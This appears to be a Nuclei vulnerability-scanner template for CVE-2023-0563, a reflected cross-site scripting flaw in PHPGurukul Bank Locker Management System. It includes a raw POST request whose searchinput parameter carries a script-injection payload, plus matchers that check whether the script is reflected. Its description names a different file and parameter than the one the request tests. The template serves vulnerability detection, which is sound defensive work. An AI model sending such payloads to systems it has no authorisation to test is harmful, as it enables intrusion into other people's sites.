id: CVE-2023-0563

info:
  name: Bank Locker Management System - Cross-Site Scripting
  author: Harsh
  severity: medium
  description: |
    A vulnerability classified as problematic has been found in PHPGurukul Bank Locker Management System 1.0. This affects an unknown part of the file add-locker-form.php of the component Assign Locker. The manipulation of the argument ahname leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://vuldb.com/?ctiid.219717
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0563
    - https://vuldb.com/?id.219717
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cve-id: CVE-2023-0563
    cwe-id: CWE-79
    epss-score: 0.00563
    epss-percentile: 0.75135
    cpe: cpe:2.3:a:phpgurukul:bank_locker_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: phpgurukul
    product: bank_locker_management_system
  tags: cve,cve2023,blms,xss,phpgurukul

http:
  - raw:
      - |
        POST /search-locker-details.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=

    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "/><script>alert(document.domain)</script>")'
          - 'contains(body, "Bank Locker Management System")'
        condition: and
# digest: 4a0a004730450220461b19adb1b0a7befb9192097ed48419fe1805b00ededbda71fd00d135ced359022100bfabf043a0f1bd26bf98d7dd473fa285f60f9bda98f6a5bf0e77c2aaf6a8f789:922c64590222798bb761d5b6d8e72950